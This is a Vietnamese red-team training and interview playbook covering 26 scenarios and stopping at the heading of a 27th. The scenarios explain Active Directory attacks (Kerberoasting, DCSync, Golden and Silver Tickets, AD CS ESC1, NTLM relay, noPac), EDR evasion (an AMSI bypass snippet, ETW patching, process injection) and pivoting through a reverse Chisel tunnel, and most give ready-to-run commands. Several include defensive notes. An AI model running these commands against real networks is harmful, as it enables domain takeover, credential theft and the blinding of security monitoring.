# BỘ 50 KỊCH BẢN THỰC CHIẾN VÀ CÂU HỎI PHỎNG VẤN RED TEAM CHUYÊN SÂU (RED TEAM SCENARIOS & INTERVIEW PLAYBOOK)

> **Tài liệu đào tạo năng lực tác chiến thực tế (Advanced Offensive Operations) & Phỏng vấn vị trí Senior Penetration Tester / Red Team Operator.**
>
> **Liên kết điều phối:** Xem [DIEU_PHOI_LO_TRINH_DOC.md](file:///mnt/second_drive/DOCS/SEC/DIEU_PHOI_LO_TRINH_DOC.md) | [01_MITRE_ATTCK_Enterprise_Matrix_Guide.md](file:///mnt/second_drive/DOCS/SEC/docs/References/01_MITRE_ATTCK_Enterprise_Matrix_Guide.md) | [02_Active_Directory_Attack_and_Defense_Playbook.md](file:///mnt/second_drive/DOCS/SEC/docs/References/02_Active_Directory_Attack_and_Defense_Playbook.md) | [05_EDR_Evasion_and_Living_Off_The_Land_LOLBAS.md](file:///mnt/second_drive/DOCS/SEC/docs/References/05_EDR_Evasion_and_Living_Off_The_Land_LOLBAS.md).
>
> Công cụ tương tác: Chạy lệnh `/usr/bin/python3.11 exam_simulator.py scenario --count 5`.

---

## PHẦN 1: ACTIVE DIRECTORY & EDR EVASION (KỊCH BẢN 1 ĐẾN 25)

### CHỦ ĐỀ 1: ACTIVE DIRECTORY & KERBEROS ATTACKS (KỊCH BẢN 1 - 12)

#### Kịch bản 01: Khai thác Kerberoasting trích xuất mật khẩu Service Account
- **Tình huống tác chiến:** Bạn vừa chiếm được shell của một người dùng thông thường (`domain user`) không có quyền quản trị trong một Domain Controller Windows Server 2019. Hãy mô tả quy trình từng bước để leo quyền thông qua kỹ thuật Kerberoasting.
- **Phương thức tấn công & Lệnh thực thi:**
  1. *Truy vấn SPN:* Sử dụng PowerView hoặc `GetUserSPNs.py` từ bộ Impacket để tìm các tài khoản người dùng có thuộc tính `servicePrincipalName` được thiết lập:
     ```bash
     python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py corp.local/jdoe:Password123 -dc-ip 10.10.10.1 -request
     ```
  2. *Cơ chế hoạt động:* Bất kỳ domain user nào cũng có quyền yêu cầu vé TGS (Ticket Granting Service) cho bất kỳ SPN nào. Vé TGS này được mã hóa bằng mã băm RC4 hoặc AES của chính tài khoản dịch vụ đó.
  3. *Cracking Offline:* Bẻ khóa hash TGS offline bằng Hashcat (chế độ 13100 cho Kerberos 5 TGS-REP etype 23):
     ```bash
     hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
     ```
- **MITRE ATT&CK:** [T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
- **Biện pháp phòng thủ:** Sử dụng Managed Service Accounts (gMSA) với mật khẩu 128 ký tự ngẫu nhiên tự đổi định kỳ, hoặc áp dụng mã hóa AES-256 bắt buộc và giám sát sự kiện Event ID 4769 với mã hóa RC4 (0x17).

#### Kịch bản 02: AS-REP Roasting trên tài khoản vô hiệu hóa Kerberos Pre-Authentication
- **Tình huống tác chiến:** Quét hệ thống AD phát hiện một số tài khoản có cờ `DONT_REQ_PREAUTH` (Do not require Kerberos preauthentication). Giải thích tại sao có thể khai thác mà không cần gửi mật khẩu?
- **Phương thức tấn công & Lệnh thực thi:**
  1. Khi cờ này được bật, bất kỳ ai cũng có thể gửi gói tin `AS-REQ` giả mạo cho KDC yêu cầu cấp vé cho username mục tiêu.
  2. KDC sẽ lập tức trả về gói `AS-REP`, trong đó có một phần được mã hóa bằng mã băm của người dùng mà không đòi hỏi bằng chứng mật khẩu trước đó.
  3. Trích xuất và bẻ khóa bằng `GetNPUsers.py`:
     ```bash
     python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -outputfile asrep.hashes
     hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
     ```
- **MITRE ATT&CK:** [T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting](https://attack.mitre.org/techniques/T1558/004/)
- **Biện pháp phòng thủ:** Bỏ tích chọn cờ "Do not require Kerberos preauthentication" trên toàn bộ tài khoản người dùng AD.

#### Kịch bản 03: Tấn công DCSync và trích xuất toàn bộ cơ sở dữ liệu NTDS.dit
- **Tình huống tác chiến:** Bạn đã chiếm được một tài khoản có hai quyền `DS-Replication-Get-Changes` và `DS-Replication-Get-Changes-All`. Làm thế nào để lấy toàn bộ password hash trong Domain mà không cần đăng nhập vào máy chủ Domain Controller?
- **Phương thức tấn công & Lệnh thực thi:**
  1. Giả lập hành vi của một Domain Controller tham gia đồng bộ dữ liệu thư mục qua giao thức MS-DRSR (Directory Replication Service Remote Protocol).
  2. Sử dụng lệnh `secretsdump.py` của Impacket hoặc Mimikatz:
     ```bash
     python3 /usr/share/doc/python3-impacket/examples/secretsdump.py corp.local/backup_svc:P@ss123@10.10.10.1 -just-dc-ntlm
     ```
  3. Trích xuất mã băm NTLM của tài khoản `krbtgt` và `Administrator`.
- **MITRE ATT&CK:** [T1003.006 - OS Credential Dumping: DCSync](https://attack.mitre.org/techniques/T1003/006/)
- **Biện pháp phòng thủ:** Kiểm toán ACL của Domain Root Object, tước bỏ quyền Replicating Directory Changes khỏi các tài khoản không phải là Domain Controller thực thụ (Event ID 4662).

#### Kịch bản 04: Tạo Golden Ticket duy trì quyền kiểm soát vĩnh viễn (Persistence)
- **Tình huống tác chiến:** Sau khi có được NTLM hash của tài khoản `krbtgt`, hãy mô tả kỹ thuật tạo Golden Ticket và thời gian tồn tại tối đa.
- **Phương thức tấn công & Lệnh thực thi:**
  1. Tài khoản `krbtgt` là tài khoản dùng để ký và mã hóa mọi vé Ticket Granting Ticket (TGT) trong Domain.
  2. Tạo vé TGT tùy ý bằng Mimikatz:
     ```powershell
     kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-XXXXX /krbtgt:HASH_KRBTGT /id:500 /groups:512,513,518,519,520 /ptt
     ```
  3. Vé này cho phép mạo danh bất kỳ user nào truy cập vào mọi tài nguyên trong domain với thời hạn hợp lệ lên tới 10 năm.
- **MITRE ATT&CK:** [T1558.001 - Steal or Forge Kerberos Tickets: Golden Ticket](https://attack.mitre.org/techniques/T1558/001/)
- **Biện pháp phòng thủ:** Thiết lập quy trình đổi mật khẩu tài khoản `krbtgt` hai lần liên tiếp (cách nhau 24 giờ để đảm bảo các vé cũ hết hạn và đồng bộ replication).

#### Kịch bản 05: Tấn công Silver Ticket chiếm dịch vụ mục tiêu (TGS Forgery)
- **Tình huống tác chiến:** Sự khác biệt giữa Golden Ticket và Silver Ticket là gì? Khi nào Red Team ưu tiên dùng Silver Ticket?
- **Phương thức tấn công & Lệnh thực thi:**
  1. *Khác biệt:* Golden Ticket giả mạo TGT (cần mã băm của `krbtgt`, tiếp cận KDC); Silver Ticket giả mạo vé dịch vụ TGS (chỉ cần mã băm của máy chủ dịch vụ mục tiêu, ví dụ MSSQL hoặc CIFS, hoàn toàn không tương tác với Domain Controller).
  2. *Lợi thế OPSEC:* Do không liên hệ với KDC, Silver Ticket không sinh ra bản ghi xác thực Event ID 4768 trên Domain Controller, khiến hệ thống giám sát SIEM rất khó phát hiện.
     ```powershell
     kerberos::golden /domain:corp.local /sid:S-1-5-21-XXXX /target:fileserver.corp.local /service:cifs /rc4:HASH_MACHINE_ACC /user:Administrator /ptt
     ```
- **MITRE ATT&CK:** [T1558.002 - Steal or Forge Kerberos Tickets: Silver Ticket](https://attack.mitre.org/techniques/T1558/002/)

#### Kịch bản 06: Khai thác lỗi Active Directory Certificate Services (AD CS) - ESC1
- **Tình huống tác chiến:** Trình bày lỗ hổng cấu hình ESC1 trong AD CS cho phép bất kỳ domain user nào cũng có thể trở thành Domain Admin.
- **Phương thức tấn công & Lệnh thực thi:**
  1. *Điều kiện tiên quyết:* Template chứng chỉ có:
     - Cho phép Domain Users yêu cầu (`Enrollment Permissions`).
     - Có cờ `ENROLLEE_SUPPLIES_SUBJECT` (cho phép client tự chỉ định tên chủ thể SAN - Subject Alternative Name).
     - Cấu hình Extended Key Usage (EKU) hỗ trợ Client Authentication hoặc Smart Card Logon.
  2. *Thực thi với Certipy:*
     ```bash
     certipy req -u jdoe@corp.local -p Password123 -ca CORP-CA -template VulnerableTemplate -upn administrator@corp.local
     certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
     ```
  3. Lấy lại NTLM hash hoặc TGT của tài khoản Quản trị viên miền.
- **MITRE ATT&CK:** [T1649 - Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/)
- **Biện pháp phòng thủ:** Tắt cờ `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` trên các template hỗ trợ Client Authentication, yêu cầu phê duyệt từ Certificate Manager (`Manager Approval`).

#### Kịch bản 07: Tấn công NTLM Relay và ép buộc xác thực qua PetitPotam (MS-EFSRPC)
- **Tình huống tác chiến:** Trong môi trường không bật SMB Signing và AD CS bật Web Enrollment (HTTP), làm thế nào để chiếm Domain Controller?
- **Phương thức tấn công & Lệnh thực thi:**
  1. Dựng `ntlmrelayx.py` lắng nghe và relay xác thực HTTP tới endpoint AD CS CA Web Enrollment:
     ```bash
     python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
     ```
  2. Ép máy chủ Domain Controller xác thực ngược lại máy attacker bằng PetitPotam (gọi hàm `EfsRpcOpenFileRaw` qua RPC):
     ```bash
     python3 PetitPotam.py 10.10.10.5 10.10.10.1
     ```
  3. `ntlmrelayx` bắt gói xác thực máy `DC$`, relay sang CA để sinh chứng chỉ số của Domain Controller, sau đó dùng chứng chỉ này để lấy hash NTDS qua DCSync.
- **MITRE ATT&CK:** [T1187 - Forced Authentication](https://attack.mitre.org/techniques/T1187/)
- **Biện pháp phòng thủ:** Bật bắt buộc SMB Signing trên toàn bộ máy chủ và tắt hoàn toàn xác thực HTTP NTLM trên các dịch vụ AD CS (chuyển sang Kerberos hoặc HTTPS với EPA).

#### Kịch bản 08: Phân tích đường dẫn leo quyền bằng BloodHound
- **Tình huống tác chiến:** Giải thích cách thu thập dữ liệu bằng SharpHound/BloodHound và nhận diện các đường dẫn tấn công thông qua thuộc tính nguy hiểm như `GenericAll`, `WriteDacl` hoặc `ForceChangePassword`.
- **Phương thức tấn công & Lệnh thực thi:**
  1. Chạy SharpHound thu thập đồ thị quan hệ trong AD:
     ```powershell
     .\SharpHound.exe --CollectionMethods All --ZipFileName bloodhound_data.zip
     ```
  2. Nhập file zip vào BloodHound GUI, chạy truy vấn "Find Shortest Paths to Domain Admins".
  3. Nếu tài khoản có quyền `WriteDacl` trên một nhóm, attacker có thể thêm chính mình vào nhóm đó:
     ```powershell
     Add-DomainGroupMember -Identity "IT-Admins" -Members "jdoe"
     ```
- **MITRE ATT&CK:** [T1069.002 - Permission Groups Discovery: Domain Groups](https://attack.mitre.org/techniques/T1069/002/)

#### Kịch bản 09: Khai thác GPO Abuse chiếm quyền toàn bộ máy trạm trong Domain
- **Tình huống tác chiến:** Bạn phát hiện tài khoản người dùng có quyền ghi (`WriteProperty` hoặc `GenericAll`) trên một Group Policy Object (GPO) được liên kết với OU chứa máy tính của toàn công ty. Hãy khai thác.
- **Phương thức tấn công & Lệnh thực thi:**
  1. Sử dụng công cụ `pyGPOAbuse` hoặc module `SharpGPOAbuse`.
  2. Chèn một Immediate Scheduled Task vào GPO để ép tất cả máy trạm thực thi lệnh tải payload C2 hoặc tạo user Local Administrator mới:
     ```bash
     python3 pyGPOAbuse.py -u jdoe -p Password123 -d corp.local -gpo-id "B0669145-..." --powershell --command "powershell -enc ..."
     ```
  3. Chờ 90 phút hoặc ép cập nhật qua `gpupdate /force`.
- **MITRE ATT&CK:** [T1484.001 - Domain Policy Modification: Group Policy Modification](https://attack.mitre.org/techniques/T1484/001/)

#### Kịch bản 10: Tấn công Shadow Credentials (msDS-KeyCredentialLink)
- **Tình huống tác chiến:** Khi tài khoản của bạn có quyền `GenericWrite` trên tài khoản máy tính hoặc tài khoản người dùng đích, làm thế nào để chiếm quyền tài khoản đó mà không cần đổi mật khẩu của họ?
- **Phương thức tấn công & Lệnh thực thi:**
  1. Khai thác thuộc tính `msDS-KeyCredentialLink` (dùng trong xác thực Windows Hello for Business).
  2. Sử dụng công cụ `Whisker` hoặc `pywhisker` để thêm một cặp khóa công khai/khóa bí mật X.509 mới vào thuộc tính này của đối tượng mục tiêu:
     ```bash
     pywhisker.py -d "corp.local" -u "jdoe" -p "Password123" --target "victim_user" --action "add" --filename "whisker"
     ```
  3. Yêu cầu vé Kerberos TGT cho tài khoản mục tiêu bằng khóa riêng vừa tạo thông qua PKINIT (công cụ Rubeus hoặc Certipy).
- **MITRE ATT&CK:** [T1556 - Modify Authentication Process](https://attack.mitre.org/techniques/T1556/)

#### Kịch bản 11: Khai thác ủy quyền Kerberos không bị ràng buộc (Unconstrained Delegation)
- **Tình huống tác chiến:** Một máy chủ web trong Domain được cấu hình `TRUSTED_FOR_DELEGATION`. Làm thế nào kẻ tấn công chiếm được máy chủ này có thể trích xuất TGT của Quản trị viên miền?
- **Phương thức tấn công & Lệnh thực thi:**
  1. Với Unconstrained Delegation, khi người dùng xác thực tới máy chủ web, một bản sao vé TGT đầy đủ của người dùng đó sẽ được KDC gửi kèm và lưu trong bộ nhớ LSASS của máy chủ web.
  2. Kẻ tấn công bẫy Domain Controller xác thực tới máy chủ web (bằng kỹ thuật PrinterBug / SpoolSample RPC call).
  3. Ngay khi DC kết nối tới, dump TGT của tài khoản `DC$` từ bộ nhớ RAM bằng Rubeus:
     ```powershell
     .\Rubeus.exe monitor /interval:5 /targetuser:DC$
     ```
  4. Sử dụng vé TGT thu được để thực hiện DCSync.
- **MITRE ATT&CK:** [T1558 - Steal or Forge Kerberos Tickets](https://attack.mitre.org/techniques/T1558/)

#### Kịch bản 12: Tấn công sAMAccountName Spoofing (noPac - CVE-2021-42287 / CVE-2021-42278)
- **Tình huống tác chiến:** Trình bày nguyên lý lỗ hổng noPac cho phép nâng quyền từ tài khoản máy tính thông thường lên Domain Controller trong vài giây.
- **Phương thức tấn công & Lệnh thực thi:**
  1. Tạo tài khoản máy mới (Machine Account Quota mặc định cho phép user tạo 10 máy).
  2. Đổi tên `sAMAccountName` của máy vừa tạo thành tên của Domain Controller nhưng bỏ dấu `$` ở cuối (ví dụ `DC1`).
  3. Yêu cầu một vé TGT cho máy này.
  4. Đổi tên `sAMAccountName` sang một tên khác ngẫu nhiên.
  5. Dùng vé TGT ban đầu để yêu cầu vé TGS cho dịch vụ KDC. Do không tìm thấy tên cũ, KDC tự động thêm dấu `$` vào cuối (`DC1$`) và cấp vé TGS với đặc quyền cao nhất của Domain Controller.
- **MITRE ATT&CK:** [T1068 - Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068/)
- **Biện pháp phòng thủ:** Cài đặt bản vá bảo mật tháng 11/2021 (KB5008380 / KB5008602) của Microsoft và đặt `ms-DS-MachineAccountQuota = 0`.

---

### CHỦ ĐỀ 2: EDR EVASION & DEFENSE EVASION (KỊCH BẢN 13 - 22)

#### Kịch bản 13: Cơ chế hoạt động của Userland API Hooking trên EDR
- **Tình huống tác chiến:** Các giải pháp EDR (CrowdStrike Falcon, Microsoft Defender for Endpoint, SentinelOne) can thiệp vào các tiến trình như thế nào để phát hiện mã độc?
- **Phương thức phân tích:**
  1. EDR tiêm một DLL giám sát của hãng vào mọi tiến trình mới được tạo trong User-mode.
  2. DLL này thực hiện kỹ thuật Inline Hooking: sửa đổi 5 byte đầu tiên của các hàm API Windows nhạy cảm trong `ntdll.dll` (như `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`) thành lệnh nhảy `JMP <EDR_Inspection_Routine>`.
  3. Khi mã độc gọi API, luồng thực thi bị chuyển hướng về EDR để kiểm tra tham số, quét bộ nhớ trước khi quyết định cho phép tiếp tục hay chặn đứng.
- **MITRE ATT&CK:** [T1055 - Process Injection](https://attack.mitre.org/techniques/T1055/)

#### Kịch bản 14: Né tránh EDR bằng Direct System Calls (Syscalls trực tiếp)
- **Tình huống tác chiến:** Làm thế nào để phần mềm của Red Team thực thi các hàm cấp phát bộ nhớ mà hoàn toàn không bị EDR Hooking chặn lại?
- **Phương thức tấn công:**
  1. Thay vì gọi qua `ntdll.dll` (nơi đã bị hook), chương trình nhúng trực tiếp mã assembly thực thi lệnh `syscall` (trên x64) cùng với số hiệu System Service Number (SSN).
  2. Luồng thực thi nhảy trực tiếp từ User-mode sang Kernel-mode thông qua ngắt hệ thống, hoàn toàn đi vòng qua các điểm hook của EDR DLL.
- **MITRE ATT&CK:** [T1106 - Native API](https://attack.mitre.org/techniques/T1106/)

#### Kịch bản 15: Kỹ thuật Hell's Gate & Halos Gate giải quyết bài toán biến động SSN
- **Tình huống tác chiến:** Số hiệu SSN thay đổi liên tục giữa các bản cập nhật Windows (Windows 10 1909 vs 21H2 vs Windows 11). Làm thế nào để tìm SSN động trong bộ nhớ?
- **Phương thức tấn công:**
  1. *Hell's Gate:* Đọc tệp `ntdll.dll` đã được nạp vào bộ nhớ, duyệt tìm hàm cần gọi và trích xuất số byte ngay sau lệnh `mov r10, rcx; mov eax, <SSN>`.
  2. *Halo's Gate:* Nếu hàm cần tìm đã bị EDR hook (byte bị ghi đè thành `JMP`), kỹ thuật Halo's Gate duyệt lên các hàm liền kề ở trên hoặc ở dưới (Neighboring stubs) để lấy SSN của hàm lân cận rồi cộng/trừ chỉ số offset tương ứng.
- **MITRE ATT&CK:** [T1106 - Native API](https://attack.mitre.org/techniques/T1106/)

#### Kịch bản 16: Né tránh giám sát Call Stack bằng Synthetic Call Stack Spoofing
- **Tình huống tác chiến:** EDR hiện đại không chỉ kiểm tra hàm mà còn kiểm tra Call Stack (ngăn xếp lời gọi) khi có lệnh syscall để phát hiện syscall xuất phát từ vùng nhớ không backed bởi tệp PE hợp lệ (Unbacked memory). Cách đối phó?
- **Phương thức tấn công:**
  1. Kỹ thuật Call Stack Spoofing (ví dụ SilentTrinity, ThreadStackSpoofer).
  2. Ngụy tạo toàn bộ các frame ngăn xếp giả mạo trông giống như luồng thực thi xuất phát từ một chuỗi lời gọi hợp lệ của hệ điều hành (ví dụ: `BaseThreadInitThunk -> RtlUserThreadStart -> KERNEL32!ReadFile`).
  3. Ghi đè địa chỉ trả về (Return Address) trước khi thực hiện cuộc gọi và khôi phục lại khi hoàn tất.
- **MITRE ATT&CK:** [T1055 - Process Injection](https://attack.mitre.org/techniques/T1055/)

#### Kịch bản 17: Vô hiệu hóa AMSI (Antimalware Scan Interface) trong bộ nhớ PowerShell
- **Tình huống tác chiến:** Khi bạn nhập các lệnh nhạy cảm như `Invoke-Mimikatz` vào PowerShell, AMSI lập tức chặn lại và báo lỗi "This script contains malicious content". Trình bày kỹ thuật Patch bộ nhớ AMSI.
- **Phương thức tấn công & Lệnh thực thi:**
  1. AMSI hoạt động thông qua thư viện `amsi.dll` được nạp vào tiến trình `powershell.exe`. Hàm cốt lõi chịu trách nhiệm thẩm định là `AmsiScanBuffer`.
  2. Thay đổi quyền của trang bộ nhớ chứa hàm `AmsiScanBuffer` thành `PAGE_EXECUTE_READWRITE` bằng `VirtualProtect`.
  3. Ghi đè byte đầu hàm bằng lệnh trả về lỗi an toàn giả định (ví dụ `mov eax, 0x80070057; ret` - mã lỗi `E_INVALIDARG` khiến hàm trả về kết quả quét rỗng):
     ```powershell
     # Kỹ thuật Patch byte AmsiScanBuffer kinh điển
     $a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
     $f=$a.GetField('amsiInitFailed','NonPublic,Static');
     $f.SetValue($null,$true);
     ```
- **MITRE ATT&CK:** [T1562.001 - Impair Defenses: Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/)

#### Kịch bản 18: Vô hiệu hóa ETW (Event Tracing for Windows) che giấu hành vi mã độc
- **Tình huống tác chiến:** ETW gửi các telemetry ghi nhận hành vi (nạp assembly, cấp phát bộ nhớ ảo) trực tiếp tới EDR và Defender. Làm thế nào để vô hiệu hóa?
- **Phương thức tấn công:**
  1. Hook hoặc patch hàm `ntdll!EtwEventWrite`.
  2. Ghi một byte `0xC3` (lệnh `RET` trong assembly x86/x64) ngay tại đầu hàm `EtwEventWrite`.
  3. Mọi cuộc gọi phát sinh sự kiện telemetry sau đó sẽ lập tức trả về mà không ghi nhận bất kỳ dữ liệu nào vào hệ thống ETW.
- **MITRE ATT&CK:** [T1562.001 - Impair Defenses: Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/)

#### Kịch bản 19: Process Hollowing tiêm mã độc vào tiến trình hợp lệ của Windows
- **Tình huống tác chiến:** Giải thích quy trình 5 bước của kỹ thuật Process Hollowing nhằm che giấu payload độc hại dưới vỏ bọc một tiến trình tin cậy như `svchost.exe`.
- **Phương thức tấn công:**
  1. *Bước 1:* Tạo tiến trình hợp lệ ở trạng thái tạm dừng (Suspended) bằng cờ `CREATE_SUSPENDED` qua `CreateProcessW`.
  2. *Bước 2:* Giải phóng (unmap) mã nguồn gốc của tiến trình đích ra khỏi bộ nhớ bằng hàm `ZwUnmapViewOfSection`.
  3. *Bước 3:* Cấp phát vùng nhớ mới trong không gian địa chỉ ảo của tiến trình đích bằng `VirtualAllocEx` với quyền `PAGE_EXECUTE_READWRITE`.
  4. *Bước 4:* Ghi payload độc hại (mã nhị phân PE) vào vùng nhớ vừa cấp phát bằng `WriteProcessMemory`.
  5. *Bước 5:* Đặt lại con trỏ lệnh Entry Point trong thanh ghi `RCX/EAX` của luồng bằng `SetThreadContext`, sau đó tiếp tục luồng bằng `ResumeThread`.
- **MITRE ATT&CK:** [T1055.012 - Process Injection: Process Hollowing](https://attack.mitre.org/techniques/T1055/012/)

#### Kịch bản 20: Kỹ thuật Early Bird QueueUserAPC Injection
- **Tình huống tác chiến:** Tại sao kỹ thuật Early Bird APC Injection lại né tránh được sự phát hiện của hầu hết EDR Hooking?
- **Phương thức tấn công:**
  1. EDR chỉ hoàn tất việc nạp DLL giám sát và thiết lập các API Hook khi luồng chính của tiến trình mới bắt đầu chạy và nạp đầy đủ các DLL phụ thuộc.
  2. Kỹ thuật Early Bird tạo tiến trình ở trạng thái Suspended, ghi mã độc vào bộ nhớ, và đưa một Asynchronous Procedure Call (APC) trỏ tới payload vào hàng đợi của luồng chính thông qua hàm `QueueUserAPC`.
  3. Khi `ResumeThread` được gọi, luồng chính thức thi ngay lập tức payload trong APC TRƯỚC KHI các hàm khởi tạo EDR DLL kịp kích hoạt và đặt hook.
- **MITRE ATT&CK:** [T1055.004 - Process Injection: Asynchronous Procedure Call](https://attack.mitre.org/techniques/T1055/004/)

#### Kịch bản 21: Tải mã độc không qua tệp (Reflective DLL Injection)
- **Tình huống tác chiến:** Phân tích cơ chế Reflective DLL Injection của Stephen Fewer cho phép nạp DLL trực tiếp từ bộ nhớ RAM mà không cần ghi tệp xuống ổ đĩa.
- **Phương thức tấn công:**
  1. DLL thông thường cần API của Windows (`LoadLibraryA`) để phân giải bảng nhập (IAT), tái định vị (Relocations) và gọi `DllMain`. Tuy nhiên `LoadLibraryA` bắt buộc nhận đường dẫn tệp trên đĩa cứng.
  2. Reflective DLL nhúng một hàm nạp tự thân (`ReflectiveLoader`) ngay trong thân DLL.
  3. Mã độc ghi toàn bộ raw buffer của DLL vào bộ nhớ tiến trình đích và gọi trực tiếp `ReflectiveLoader`. Hàm này tự phân giải ntdll/kernel32, tự tính toán IAT, fix relocations và gọi `DllMain` hoàn toàn trong RAM.
- **MITRE ATT&CK:** [T1055.001 - Process Injection: Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001/)

#### Kịch bản 22: Kỹ thuật DLL Proxying / DLL Sideloading
- **Tình huống tác chiến:** Làm thế nào để thực thi mã độc thông qua một tệp nhị phân có chữ ký số hợp lệ của Microsoft (ví dụ `teams.exe` hoặc `onedrive.exe`)?
- **Phương thức tấn công:**
  1. Tìm một phần mềm hợp lệ có chữ ký số tin cậy nạp một DLL phụ thuộc mà không chỉ định đường dẫn tuyệt đối.
  2. Tạo một DLL độc hại có cùng tên và cùng các hàm xuất khẩu (Export Functions) với DLL gốc. Các hàm xuất khẩu này được cấu hình chuyển tiếp (forwarding) cuộc gọi tới DLL gốc thực sự được đổi tên để phần mềm không bị crash.
  3. Đặt tệp nhị phân hợp lệ và DLL giả vào cùng một thư mục và kích hoạt. EDR nhìn thấy tiến trình tin cậy có chữ ký số chạy nên giảm mức cảnh báo.
- **MITRE ATT&CK:** [T1574.002 - Hijack Execution Flow: DLL Side-Loading](https://attack.mitre.org/techniques/T1574/002/)

---

### CHỦ ĐỀ 3: NETWORK PIVOTING & LATERAL MOVEMENT (KỊCH BẢN 23 - 25)

#### Kịch bản 23: Thiết lập SOCKS5 Proxy đa tầng với Chisel qua kết nối HTTP Reverse Tunnel
- **Tình huống tác chiến:** Máy chủ bị thỏa hiệp (Compromised Web Server) nằm trong DMZ chỉ cho phép kết nối Outbound qua cổng TCP 443. Bên trong mạng nội bộ còn có dải IP `10.10.20.0/24` không có internet. Làm thế nào để định tuyến toàn bộ công cụ của máy Attacker vào dải nội bộ này?
- **Phương thức tấn công & Lệnh thực thi:**
  1. Trên máy Attacker (IP công cộng `203.0.113.5`), bật Chisel Server:
     ```bash
     ./chisel server --port 443 --reverse
     ```
  2. Trên máy nạn nhân trong DMZ, kích hoạt Chisel Client kết nối ngược ra ngoài và mở Reverse SOCKS:
     ```bash
     ./chisel client 203.0.113.5:443 R:socks
     ```
  3. Mặc định Chisel mở cổng SOCKS5 tại `127.0.0.1:1080` trên máy Attacker.
  4. Cấu hình `/etc/proxychains4.conf`:
     ```text
     socks5 127.0.0.1 1080
     ```
  5. Quét mạng nội bộ thông qua tunnel:
     ```bash
     proxychains4 nmap -sT -Pn -p 80,445,3389 10.10.20.15
     ```
- **MITRE ATT&CK:** [T1572 - Protocol Tunneling](https://attack.mitre.org/techniques/T1572/)

#### Kịch bản 24: Di chuyển ngang (Lateral Movement) bằng WMI và WinRM thay thế PsExec
- **Tình huống tác chiến:** Tại sao các đội Red Team chuyên nghiệp hạn chế sử dụng công cụ `PsExec` truyền thống và thay thế bằng WMI hoặc WinRM khi di chuyển ngang?
- **Phương thức phân tích & So sánh:**
  1. *Nhược điểm của PsExec:* PsExec tải một tệp thực thi dịch vụ (`PSEXESVC.exe`) lên share `ADMIN$` và tạo một service Windows mới (sinh Event ID 7045 - A service was installed in the system). Dấu vết này bị các hệ thống SIEM và EDR phát hiện ngay lập tức.
  2. *Ưu điểm của WMI (Windows Management Instrumentation):* Khởi tạo tiến trình mới thông qua lớp `Win32_Process.Create` trên cổng RPC/135. Không tạo service, không ghi file xuống đĩa, chỉ sinh Event ID 4688 trên máy đích.
     ```bash
     python3 /usr/share/doc/python3-impacket/examples/wmiexec.py corp.local/admin:Pass@10.10.20.15
     ```
  3. *Ưu điểm của WinRM:* Giao thức chuẩn quản trị từ xa qua HTTP/HTTPS (cổng 5985/5986), sử dụng PowerShell Remoting (`Enter-PSSession` hoặc `evil-winrm`), lưu lượng được mã hóa chuẩn.
- **MITRE ATT&CK:** [T1047 - Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047/)

#### Kịch bản 25: Chuyển hướng lưu lượng bằng SSH Dynamic Port Forwarding
- **Tình huống tác chiến:** Khi bạn chiếm được thông tin đăng nhập SSH của một máy chủ Linux nội bộ, hãy trình bày lệnh tạo SOCKS proxy cục bộ và lệnh Local Port Forwarding để tiếp cận giao diện quản trị router nội bộ.
- **Phương thức tấn công & Lệnh thực thi:**
  1. *Tạo SOCKS5 Proxy toàn dải mạng:*
     ```bash
     ssh -D 9050 -N -f user@192.168.1.50
     ```
  2. *Chuyển tiếp cổng cục bộ (Local Forwarding) để mở Web Admin Router `10.0.0.1:80`:*
     ```bash
     ssh -L 8080:10.0.0.1:80 user@192.168.1.50 -N -f
     ```
  3. Mở trình duyệt tại máy Attacker truy cập `http://127.0.0.1:8080` để tương tác trực tiếp với Router nội bộ.
- **MITRE ATT&CK:** [T1572 - Protocol Tunneling](https://attack.mitre.org/techniques/T1572/)


---

## PHẦN 2: LATERAL MOVEMENT, ADVANCED WEB & C2 OPSEC (KỊCH BẢN 26 ĐẾN 50)

### TIẾP TỤC CHỦ ĐỀ 3: NETWORK PIVOTING & LATERAL MOVEMENT (KỊCH BẢN 26 - 30)

#### Kịch bản 26: Di chuyển ngang qua DCOM (Distributed Component Object Model)
- **Tình huống tác chiến:** Khi quản trị viên mạng đã chặn cổng 445 (SMB) và tắt tính năng WinRM giữa các máy trạm trong cùng một VLAN, làm thế nào để thực thi lệnh từ xa thông qua các đối tượng DCOM?
- **Phương thức tấn công & Lệnh thực thi:**
  1. DCOM giao tiếp qua cổng RPC 135 kết hợp dải cổng động (High Dynamic Ports).
  2. Khai thác các đối tượng DCOM có sẵn trên Windows như `MMC20.Application` hoặc `ShellWindows`:
     ```powershell
     # Thực thi lệnh từ xa bằng MMC20.Application qua PowerShell
     $dcom = [Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.20.20"))
     $dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c calc.exe", "Minimized")
     ```
  3. Hoặc sử dụng `dcomexec.py` từ bộ Impacket:
     ```bash
     python3 /usr/share/doc/python3-impacket/examples/dcomexec.py -object MMC20 corp.local/admin:Pass@10.10.20.20
     ```
- **MITRE ATT&CK:** [T1021.003 - Remote Services: Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003/)

#### Kịch bản 27: Khai thác RDP Session Hijacking (Kỹ thuật `tscon`)
